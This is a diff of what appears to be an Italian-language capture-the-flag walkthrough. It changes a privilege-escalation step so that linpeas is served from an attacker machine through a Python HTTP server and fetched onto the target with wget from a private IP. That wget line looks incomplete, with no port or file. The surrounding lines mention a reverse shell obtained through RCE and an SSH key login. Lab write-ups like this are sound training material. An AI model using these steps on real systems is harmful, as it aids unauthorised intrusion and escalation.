@@ -65,7 +65,10 @@ Now use the rce to obtain a reverse shell
 *www-Data to John*
 Scarica linpeas ed avvialo
 ```bash
-wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
+python3 -m http.server 8080
+```
+```bash
+wget http://192.168.86.130
 ```
 avvialo
 ```bash
@@ -134,6 +137,7 @@ Entra su ssh come j.brock
 ==ricorda chmod 400 su id_rsa==
 ### **j.brock to m.hack**
 Scarica linpeas ed avvialo
+
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
 ```
